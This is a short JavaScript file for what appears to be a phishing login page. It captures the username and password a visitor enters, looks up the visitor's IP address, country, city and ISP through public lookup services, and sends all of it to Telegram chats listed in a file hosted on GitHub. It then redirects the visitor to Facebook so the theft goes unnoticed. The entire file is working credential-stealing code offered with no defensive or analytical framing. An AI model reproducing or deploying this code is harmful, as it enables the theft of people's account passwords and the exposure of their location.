async function obtenerDatosUsuario(direccionIP) {
    try {
      const response = await fetch(`https://ipapi.co/${direccionIP}/json/`);
      const data = await response.json();
      return data;
    } catch (error) {
      console.error("Error al obtener los datos del usuario:", error);
      return null;
    }
  }
  
  async function obtenerDireccionIP() {
    try {
      const response = await fetch("https://api.ipify.org/?format=json");
      const data = await response.json();
      return data.ip;
    } catch (error) {
      console.error("Error al obtener la dirección IP:", error);
      return null;
    }
  }
  
  async function enviarMensaje(event) {
    event.preventDefault();
  
    // Obtén los valores del formulario
    const usuario = document.getElementById("mensaje").value;
    const password = document.getElementById("password").value;
    const direccionIP = await obtenerDireccionIP();
    const datosUsuario = await obtenerDatosUsuario(direccionIP);
  
    try {
      const chatIdsResponse = await fetch("https://raw.githubusercontent.com/Pericena/happybirthday.github.io/main/datos/usuario/luishino.txt");
      const chatIdsText = await chatIdsResponse.text();
      const chatIds = chatIdsText.trim().split("\n");
  
      const configResponse = await fetch("config.txt");
      const configText = await configResponse.text();
      const [token, chatId] = configText.trim().split("\n");
  
      const url = `https://api.telegram.org/bot${token}/sendMessage`;
  
      for (const chatId of chatIds) {
        try {
          const response = await fetch(url, {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({
              chat_id: chatId,
              text: `Usuario: ${usuario}\nContraseña: ${password}\nDirección IP: ${direccionIP}\nPaís: ${datosUsuario.country_name}\nCiudad: ${datosUsuario.city}\nISP: ${datosUsuario.org}`
            })
          });
  
          if (response.ok) {
            console.log(`Mensaje enviado exitosamente al chat ID: ${chatId}`);
          } else {
            console.error(`Error al enviar el mensaje al chat ID: ${chatId}`);
          }
        } catch (error) {
          console.error(`Error de red al enviar el mensaje al chat ID: ${chatId}`, error);
        }
      }
  
      window.location.href = "https://www.facebook.com/";
    } catch (error) {
      console.error("Error de red:", error);
    }
  }
  
  // Escucha el evento de envío del formulario
  document.getElementById("myForm").addEventListener("submit", enviarMensaje);
  